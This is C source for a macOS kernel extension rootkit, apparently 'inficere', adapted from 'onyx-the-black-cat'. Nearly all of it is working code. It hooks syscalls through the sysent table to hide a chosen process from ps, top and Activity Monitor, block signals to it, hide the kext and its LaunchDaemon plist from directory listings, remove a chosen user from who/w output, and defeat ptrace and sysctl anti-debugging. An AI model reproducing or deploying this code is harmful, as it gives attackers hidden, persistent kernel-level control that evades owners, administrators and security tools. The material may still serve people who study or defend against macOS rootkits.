/*
 * Copyright (c) fG!, 2011, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Original code from "onyx-the-black-cat". Modified by Enzo Matsumiya (@enzolovesbacon).
 *
 * Copyright (c) 2013, 2014 - Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/kernel_types.h>
#include <sys/attr.h>
#include "anti.h"
#include "proc.h"
#include "sysent.h"
#include "data_def.h"
#include "cpu_protections.h"
#include "kinfo.h"
#include "cdisasm_utils.h"
#include "my_utils.h"

/* ptrace request */
#define PT_DENY_ATTACH		31

/* flags for checking which functions has been hooked */
#define	HK_PTRACE		0x0001
#define	HK_SYSCTL		0x0002
#define	HK_KILL			0x0004
#define HK_OPEN_NC		0x0008
#define HK_READ_NC		0x0010
#define HK_RESERVED2		0x0020
#define HK_RESERVED3		0x0040
#define HK_RESERVED4		0x0080
#define HK_RESERVED5		0x0100
#define HK_RESERVED6		0x0200
#define HK_RESERVED7		0x0400

extern struct sysent *g_sysent;	/* 'sysent.c' */
extern struct kernel_info g_kernel_info; /* 'inficere.c' */

static boolean_t g_counter;
/*static*/ uint16_t g_hooked_functions;
int g_pid = -1;
int current_idx_file_hidden = 2; /* 0 is kext, 1 is LaunchDaemon plist */
char *g_hidden_user = NULL;
static int g_fd = -1;

typedef void (*proc_list_lockp)(void); /* hide_proc() */
typedef void (*proc_list_unlockp)(void); /* hide_proc() */

/* hide_proc() */
struct proclist {
	struct proc *lh_first;
};

/* ifc_getdirentriesattr(2) */
struct FInfoAttrBuf {
	uint32_t	length;
	attrreference_t name;
	fsobj_type_t    objType;
	char            finderInfo[32];
};

typedef struct FInfoAttrBuf FInfoAttrBuf;

char *files_to_hide[MAX_FILES_TO_HIDE+1] = {
	KEXTNAME, /* kext */
	BUNDLE_PLIST, /* LaunchDaemon plist */
	/*
	 * [2..7] reserved for other files
	 */
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

static kern_return_t hide_proc(int pid);
kern_return_t hide_kext(struct kernel_info *kinfo);

int (*sys_ptrace)(struct proc *, struct ptrace_args *, int *);
int (*sys_sysctl)(struct proc *, struct __sysctl_args *, int *);
int (*sys_kill)(struct proc *, struct kill_args *, int *);
int (*sys_getdirentriesattr)(struct proc *, struct getdirentriesattr_args *, int *);
int (*sys_getdirentries)(struct proc *, struct getdirentries_args *, int *);
int (*sys_getdirentries64)(struct proc *, struct getdirentries64_args *, int *);
int (*sys_seteuid)(struct proc *, struct seteuid_args *, int *);
int (*sys_open_nocancel)(struct proc *, struct open_nocancel_args *, int *);
int (*sys_read_nocancel)(struct proc *, struct read_nocancel_args *, int *);
static int ifc_ptrace(struct proc *, struct ptrace_args *, int *);
static int ifc_sysctl(struct proc *, struct __sysctl_args *, int *);
static int ifc_kill(struct proc *, struct kill_args *, int *);
static int ifc_getdirentriesattr(struct proc *, struct getdirentriesattr_args *, int *);
static int ifc_getdirentries(struct proc *, struct getdirentries_args *, int *) __attribute__((unused));
static int ifc_getdirentries64(struct proc *, struct getdirentries64_args *, int *);
static int ifc_open_nocancel(struct proc *, struct open_nocancel_args *, int *);
static int ifc_read_nocancel(struct proc *, struct read_nocancel_args *, int *);

#pragma mark Functions to install and remove sysent hooks

kern_return_t anti_ptrace(int cmd)
{
	/* Mountain Lion (10.8+) moved sysent[] to read-only section */
	kwrite_on();
	
	/*
	 * we check if the syscalls had been already assigned, because we get kernel panic if we overwrite the syscall with same function
	 */
	if(cmd == DISABLE && g_sysent[SYS_ptrace].sy_call != (sy_call_t *)sys_ptrace) {
		if(sys_ptrace != NULL) {
			/* restore pointer to the original function */
			g_sysent[SYS_ptrace].sy_call = (sy_call_t *)sys_ptrace;
			
			/* remove the flag that indicates the hooked status */
			g_hooked_functions &= ~HK_PTRACE;
		} else {
			return KERN_FAILURE;
		}
	} else if(cmd == ENABLE && !(g_hooked_functions & HK_PTRACE)) {
		/* save address of the real function */
		sys_ptrace = (void *)g_sysent[SYS_ptrace].sy_call;
		
		/* hook the syscall by replacing the pointer in sysent */
		g_sysent[SYS_ptrace].sy_call = (sy_call_t *)ifc_ptrace;
		
		/* we set our global variable g_hooked_functions to know this function has been hooked */
		g_hooked_functions |= HK_PTRACE;
	}
	
	kwrite_off();
	
	return KERN_SUCCESS;
}

kern_return_t anti_sysctl(int cmd)
{
	kwrite_on();
	
	if(cmd == DISABLE && g_sysent[SYS___sysctl].sy_call != (sy_call_t *)sys_sysctl) {
		if(sys_sysctl != NULL) {
			g_sysent[SYS___sysctl].sy_call = (sy_call_t *)sys_sysctl;
			
			g_hooked_functions &= ~HK_SYSCTL;
		} else {
			return KERN_FAILURE;
		}
	} else if(cmd == ENABLE && !(g_hooked_functions & HK_SYSCTL)) {
		sys_sysctl = (void *)g_sysent[SYS___sysctl].sy_call;
		
		g_sysent[SYS___sysctl].sy_call = (sy_call_t *)ifc_sysctl;
		
		g_hooked_functions |= HK_SYSCTL;
	}
	
	kwrite_off();
	
	return KERN_SUCCESS;
}

kern_return_t anti_kill(int cmd)
{
	kwrite_on();
	
	if(cmd == DISABLE && g_sysent[SYS_kill].sy_call != (sy_call_t *)sys_kill) {
		if(sys_kill != NULL) {
			g_sysent[SYS_kill].sy_call = (sy_call_t *)sys_kill;
			
			g_hooked_functions &= ~HK_KILL;
		} else {
			return KERN_FAILURE;
		}
	} else if(cmd == ENABLE && !(g_hooked_functions & HK_KILL)) {
		sys_kill = (void *)g_sysent[SYS_kill].sy_call;
		
		g_sysent[SYS_kill].sy_call = (sy_call_t *)ifc_kill;
		
		g_hooked_functions |= HK_KILL;
	}
	
	kwrite_off();
	
	return KERN_SUCCESS;
}

kern_return_t hide_file(int cmd)
{
	kwrite_on();
	
	if(cmd == DISABLE && g_sysent[SYS_getdirentries64].sy_call != (sy_call_t *)sys_getdirentries64) {
		if(sys_getdirentries64 != NULL) {
			g_sysent[SYS_getdirentries64].sy_call = (sy_call_t *)sys_getdirentries64;
			g_sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
			g_sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)sys_getdirentriesattr;
		} else {
			return KERN_FAILURE;
		}
	} else if(cmd == ENABLE
		  && sys_getdirentries64 != (void *)g_sysent[SYS_getdirentries64].sy_call
		  && g_sysent[SYS_getdirentries64].sy_call != (sy_call_t *)ifc_getdirentries64) {
		sys_getdirentries64 = (void *)g_sysent[SYS_getdirentries64].sy_call;
		sys_getdirentries = (void *)g_sysent[SYS_getdirentries].sy_call;
		sys_getdirentriesattr = (void *)g_sysent[SYS_getdirentriesattr].sy_call;
		
		g_sysent[SYS_getdirentries64].sy_call = (sy_call_t *)ifc_getdirentries64;
		g_sysent[SYS_getdirentries].sy_call = (sy_call_t *)ifc_getdirentries;
		g_sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)ifc_getdirentriesattr;
	}
	
	kwrite_off();
	
	return KERN_SUCCESS;
}

kern_return_t set_seteuid(void)
{
	/* just get seteuid(2) from kernel */
	sys_seteuid = (void *)g_sysent[SYS_seteuid].sy_call;
	
	return KERN_SUCCESS;
}

kern_return_t hook_open_nc(int cmd)
{
	kwrite_on();
	
	if(cmd == DISABLE && g_sysent[SYS_open_nocancel].sy_call != (sy_call_t *)sys_open_nocancel) {
		if(sys_open_nocancel != NULL) {
			g_sysent[SYS_open_nocancel].sy_call = (sy_call_t *)sys_open_nocancel;
			
			g_hooked_functions &= ~HK_OPEN_NC;
		} else {
			return KERN_FAILURE;
		}
	} else if(cmd == ENABLE && !(g_hooked_functions & HK_OPEN_NC)) {
		sys_open_nocancel = (void *)g_sysent[SYS_open_nocancel].sy_call;
		
		g_sysent[SYS_open_nocancel].sy_call = (sy_call_t *)ifc_open_nocancel;
		
		g_hooked_functions |= HK_OPEN_NC;
	}
	
	kwrite_off();
	
	return KERN_SUCCESS;
}

kern_return_t hook_read_nc(int cmd)
{
	kwrite_on();
	
	if(cmd == DISABLE && g_sysent[SYS_read_nocancel].sy_call != (sy_call_t *)sys_read_nocancel) {
		if(sys_read_nocancel != NULL) {
			g_sysent[SYS_read_nocancel].sy_call = (sy_call_t *)sys_read_nocancel;
			
			g_hooked_functions &= ~HK_READ_NC;
		} else {
			return KERN_FAILURE;
		}
	} else if(cmd == ENABLE && !(g_hooked_functions & HK_READ_NC)) {
		sys_read_nocancel = (void *)g_sysent[SYS_read_nocancel].sy_call;
		
		g_sysent[SYS_read_nocancel].sy_call = (sy_call_t *)ifc_read_nocancel;
		
		g_hooked_functions |= HK_READ_NC;
	}
	
	kwrite_off();
	
	return KERN_SUCCESS;
}

kern_return_t hide_user(int cmd)
{
	if(g_hidden_user != NULL) {
		hook_open_nc(cmd);
		hook_read_nc(cmd);
	}
	
	return KERN_SUCCESS;
}

#pragma mark inficere functions

/*
 *	This will allow to bypass the PT_DENY_ATTACH and P_LNOATTACH (flag that denies dtrace tracing)
 */
static int ifc_ptrace(struct proc *p, struct ptrace_args *uap, int *retv)
{
	/* verify if it's a PT_DENY_ATTACH request and fix for all processes that call it */
	if(uap->req == PT_DENY_ATTACH) {
		//char processname[MAXCOMLEN+1];
		
		//proc_name(p->p_pid, processname, sizeof(processname));
		
		return ESRCH;
	}
	
	return sys_ptrace(p, uap, retv);
}

/*
 *	Hooked sysctl so we can intercept a debug call
 *	"Q:  How do I determine if I'm being run under the debugger?" http://developer.apple.com/library/mac/qa/qa1361/_index.html
 *
 *	It also hides the process specified by g_pid from 'ps', 'top' and 'Activity Monitor'
 *
 *	From http://thc.org/papers/bsdkern.html#II.3.1.
 *
 */
static int ifc_sysctl(struct proc *p, struct __sysctl_args *uap, int *retv)
{
	int mib[4];
	size_t oldlen;
	size_t newlen;
	struct kinfo_proc kpr;
	struct user64_kinfo_proc kpr64;
	int ret = sys_sysctl(p, uap, retv);
	int i = 0;
	
	copyin(uap->name, &mib, sizeof(mib));
	
	/* this handles 'ps $PID' */
	if(mib[2] == KERN_PROC_PID) {
		if(mib[3] == g_pid) {
			oldlen = 0;
			
			copyout(&oldlen, uap->oldlenp, sizeof(oldlen));
			
			return ESRCH;
		}

		return ret;
	}
	
	/* the following code will handle calls like 'ps aux', 'top' and 'Activity Monitor' */
	if(mib[0] == CTL_KERN && mib[1] == KERN_PROC) {
		if(uap->old != USER_ADDR_NULL) {
			if(g_counter == 0) {
				g_counter = 1;
				
				/* 64 bit proc */
				if(p->p_flag & P_LP64) {
					copyin(uap->oldlenp, &oldlen, sizeof(oldlen));
					
					for(i = 0; (i * sizeof(kpr64)) <= oldlen; i++) {
						copyin(uap->old + i * sizeof(kpr64), &kpr64, sizeof(kpr64));
						
						if(kpr64.kp_proc.p_pid == g_pid) {
							/* we hide it old school, because this still works (e.g. for 'ps') */
							hide_proc(g_pid);
							
							/*
							 * bypass the anti-debug call, if there is one
							 * (anti-anti-debug trick by fG!)
							 */
							if((kpr64.kp_proc.p_flag & P_TRACED) != 0) {
								kpr64.kp_proc.p_flag = kpr64.kp_proc.p_flag & ~P_TRACED;
								
								copyout(&kpr64, uap->old, sizeof(kpr64));
							}
							
							newlen = oldlen - sizeof(kpr64);
							
							/*
							 * then we overlap our process' memory with the entries ahead
							 * (need this to hide from 'Activity Monitor')
							 */
							bcopy(uap->old + (i + 1) * sizeof(kpr64), uap->old + i * sizeof(kpr64), oldlen - (i + 1) * sizeof(kpr64));
							
							goto out;
						}
					}
				} else {
					/* 32 bit proc */
					copyin(uap->oldlenp, &oldlen, sizeof(oldlen));
					
					for(i = 0; (i * sizeof(kpr)) <= oldlen; i++) {
						copyin(uap->old + i * sizeof(kpr), &kpr, sizeof(kpr));
						
						if(kpr.kp_proc.p_pid == g_pid) {
							hide_proc(g_pid);
							
							if((kpr.kp_proc.p_flag & P_TRACED) != 0) {
								kpr.kp_proc.p_flag = kpr.kp_proc.p_flag & ~P_TRACED;
								
								copyout(&kpr, uap->old, sizeof(kpr));
							}
							
							newlen = oldlen - sizeof(kpr);
							
							bcopy(uap->old + (i + 1) * sizeof(kpr), uap->old + i * sizeof(kpr), oldlen - (i + 1) * sizeof(kpr));
							
							goto out;
						}
					}
				}
				
			out:
				copyout(&newlen, uap->oldlenp, sizeof(oldlen));
				
				return ESRCH;
			}
		} else {
			copyin(uap->oldlenp, &oldlen, sizeof(oldlen));
			
			/*
			 * From bsd/kern/kern_proc.c: BSD uses a size overestimated by 5 structures, so we need to correct (decrease) that
			 */
			if(p->p_flag & P_LP64)
				oldlen -= sizeof(kpr64) * 5;
			else
				oldlen -= sizeof(kpr) * 5;
			
			newlen = oldlen;
			
			g_counter = 0;
		}
	}
	
	return ret;
}

static int ifc_kill(struct proc *p, struct kill_args *uap, int *retv)
{
	/*
	 * we check if it's our PID being signaled
	 *
		If pid is -1, sig shall be sent to all processes (excluding an unspecified set of system processes)
		for which the process has permission to send that signal.

		If pid is negative, but not -1, sig shall be sent to all processes (excluding an unspecified set of
		system processes) whose process group ID is equal to the absolute value of pid, and for which the
		process has permission to send a signal.
	 
	 *
	 * from: http://pubs.opengroup.org/onlinepubs/9699919799/functions/kill.html
	 *
	 */
	if(uap->pid == g_pid || uap->pid < 0) {
		return ESRCH;
	}
	
	return sys_kill(p, uap, retv);
}

static int ifc_getdirentriesattr(struct proc *p, struct getdirentriesattr_args *uap, int *retv)
{
	int ret = sys_getdirentriesattr(p, uap, retv);
	uint32_t nfound = 0;
	uint32_t count = 0;
	char *buffer;
	
	size_t bufsize = uap->buffersize;
	
	copyin(uap->count, &count, 4 /* sizeof(count) */);
	
	if(count > 0 && bufsize > 0) {
		buffer = _MALLOC(uap->buffersize, M_TEMP, M_WAITOK);
		
		if(buffer == NULL)
			return ret;
		
		copyin(uap->buffer, buffer, bufsize);
		
		FInfoAttrBuf *entry = (FInfoAttrBuf *)buffer;
		
		while(count > 0) {
			char *currentfile = ((char *)&entry->name) + entry->name.attr_dataoffset;
			
			int i;
			int found_to_hide = 0;
			
			for(i = 0; i < MAX_FILES_TO_HIDE; i++) {
				if(files_to_hide[i] == NULL) {
					break;
				}
				
				if((memcmp(currentfile, files_to_hide[i], strlen(files_to_hide[i]) + 1) == 0)) {
					char *next = ((char *)entry + entry->length);
					uint64_t offset = (char *)next - (char *)buffer;
					
					bcopy(next, entry, bufsize - offset);
					
					nfound++;
					count--;
					
					if(count == 0)
						goto out;
					
					found_to_hide = 1;
				}
			}
			
			if(found_to_hide == 0) {
				entry = (FInfoAttrBuf *)((char *)entry + entry->length);
				
				count--;
			}
		}
		
	out:
		if(nfound > 0) {
			copyin(uap->count, &count, sizeof(uint32_t));
			
			count -= nfound;
			
			copyout(&count, uap->count, sizeof(uint32_t));
			copyout(buffer, uap->buffer, uap->buffersize);
		}
		
		_FREE(buffer, M_TEMP);
	}
	
	return ret;
}

static int ifc_getdirentries(struct proc *p, struct getdirentries_args *uap, int *retv)
{
	return sys_getdirentries(p, uap, retv);
}

static int ifc_getdirentries64(struct proc *p, struct getdirentries64_args *uap, int *retv)
{
	int ret = sys_getdirentries64(p, uap, retv);
	char *buffer, *end;
	
	buffer = _MALLOC(uap->bufsize, M_TEMP, M_WAITOK);

	if(buffer == NULL)
		return ret;
	
	copyin(uap->buf, buffer, uap->bufsize);
	
	end = buffer + uap->bufsize;
	
	struct direntry *entry = (struct direntry *)buffer;
	
	/* number of matching entries found */
	uint32_t nfound = 0;
	/* length of removed entry */
	uint32_t removedlen = 0;
	
	while(((char *)entry < end) && (entry->d_reclen > 0)) {
		char *currentfile = entry->d_name;
		
		int i;
		int found_to_hide = 0;
		
		for(i = 0; i < MAX_FILES_TO_HIDE; i++) {
			if(files_to_hide[i] == NULL) {
				/* last element on the array will always be NULL, so there's no need to continue */
				break;
			}
			
			if((memcmp(currentfile, files_to_hide[i], strlen(files_to_hide[i]) + 1) == 0)) {
				uint16_t thisremovedlen = entry->d_reclen;
				char *current = (char *)entry;
				char *next = current + entry->d_reclen;
				int32_t size_left = uap->bufsize - (current - buffer);
				
				memmove(current, next, size_left);
				
				nfound++;
				removedlen += thisremovedlen;
				
				end -= thisremovedlen;
				
				found_to_hide = 1;
			}
		}
		
		if(found_to_hide == 0) {
			char *next = ((char *)entry) + entry->d_reclen;
			
			entry = (struct direntry *)next;
		}
	}

	if(nfound > 0) {
		*retv -= removedlen;
		
		copyout(buffer, uap->buf, uap->bufsize);
	}
	
	_FREE(buffer, M_TEMP);
	
	return ret;
}

static int ifc_open_nocancel(struct proc *p, struct open_nocancel_args *uap, int *retv)
{
	char buf[MAXCOMLEN+1];
	int ret = sys_open_nocancel(p, uap, retv);
	
	if(ret == -1)
		return ret;
	
	proc_name(p->p_pid, buf, MAXCOMLEN);
	
	if((strncmp(buf, "who", strlen(buf)) == 0) || (strncmp(buf, "w", strlen(buf)) == 0)) {
		/* this is the file that holds the users logged in */
		if(strncmp(uap->path, "/var/run/utmpx", strlen(uap->path)) == 0) {
			g_fd = *retv;
		}
	}
	
	return ret;
}

static int ifc_read_nocancel(struct proc *p, struct read_nocancel_args *uap, int *retv)
{
	int ret = sys_read_nocancel(p, uap, retv);
	
	/* this means that open() was called for /var/run/utmpx */
	if(g_fd != -1) {
		if(uap->fd == g_fd && uap->cbuf != 0) {
			if(g_hidden_user == NULL)
				goto out;
			
			unsigned int buflen = *retv;
			unsigned int skip = 0x4e8; /* utmpx "header" - useless */
			unsigned int utsize = 0x274; /* NOT sizeof(struct utmpx) */
			unsigned int type_offset = 0x128; /* ut_type offset */
			char *orig_buf = _MALLOC(buflen, M_TEMP, M_WAITOK);
			char *buf;
			char *end_buf;
			int i;
			
			memcpy(orig_buf, uap->cbuf, buflen);
			
			buf = orig_buf + skip;
			end_buf = orig_buf + buflen;
			
			while(buf < end_buf) {
				if(strncmp(buf, g_hidden_user, strlen(g_hidden_user)) == 0) {
					for(i=0;i < utsize; i++) {
						if(i == type_offset) /* patch ut_type to 0 (EMPTY) so it wont be displayed */
							buf[i] = 0;
					}
				}
				
				buf += utsize;
			}
			
			copyout(orig_buf, uap->cbuf, buflen);
			
			_FREE(orig_buf, M_TEMP);

		out:
			g_fd = -1;
		}
	}

	return ret;
}

static uint16_t g_hooked_functions_tmp;

kern_return_t set_orig_sysent(void)
{
	g_hooked_functions_tmp = g_hooked_functions;
	
	if(g_hooked_functions_tmp & HK_PTRACE) {
		anti_ptrace(DISABLE);
	}
	
	if(g_hooked_functions_tmp & HK_SYSCTL) {
		anti_sysctl(DISABLE);
	}
	
	if(g_hooked_functions_tmp & HK_KILL) {
		anti_kill(DISABLE);
	}
	
	if(g_hooked_functions_tmp & HK_READ_NC) {
		hook_read_nc(DISABLE);
	}
	
	if(g_hooked_functions_tmp & HK_OPEN_NC) {
		hook_open_nc(DISABLE);
	}
	
	return KERN_SUCCESS;
}

/*
 *	XXX: not used
 */
kern_return_t set_hooked_sysent(void)
{
	if(g_hooked_functions_tmp & HK_PTRACE) {
		anti_ptrace(ENABLE);
	}
	
	if(g_hooked_functions_tmp & HK_SYSCTL) {
		anti_sysctl(ENABLE);
	}
	
	if(g_hooked_functions_tmp & HK_KILL) {
		anti_kill(ENABLE);
	}
	
	return KERN_SUCCESS;
}

static kern_return_t hide_proc(int pid)
{
	if(pid <= 1)
		goto out;
	
	mach_vm_address_t proc_list_lock_sym = solve_k_sym(&g_kernel_info, "_proc_list_lock");
	mach_vm_address_t proc_list_unlock_sym = solve_k_sym(&g_kernel_info, "_proc_list_unlock");
	
	if(proc_list_lock_sym == 0) {
		return KERN_FAILURE;
	}
	
	if(proc_list_unlock_sym == 0) {
		return KERN_FAILURE;
	}
	
	proc_list_lockp my_proc_list_lock = (proc_list_lockp)proc_list_lock_sym;
	proc_list_unlockp my_proc_list_unlock = (proc_list_unlockp)proc_list_unlock_sym;
	
	struct proc *p = find_proc(pid);
	
	if(p != NULL) {
		my_proc_list_lock();
		
		LIST_REMOVE(p, p_list);
		LIST_REMOVE(p, p_hash);
		
		my_proc_list_unlock();
		
		return KERN_SUCCESS;
	}
	
out:
	/* pid is either invalid or was not found */
	return KERN_FAILURE;
}

struct proc *find_proc(int pid)
{
	mach_vm_address_t allproc_sym = solve_k_sym(&g_kernel_info, "_allproc");
	
	if(allproc_sym == 0) {
		return KERN_FAILURE;
	}
	
	struct proclist *allproc = (struct proclist *)allproc_sym;
	struct proc *p;
	
	if(pid > 0) {
		for(p = allproc->lh_first; p != 0; p = p->p_list.le_next) {
			if(pid == p->p_pid) {
				return p;
			}
		}
	}
	
	/* process not found */
	return NULL;
}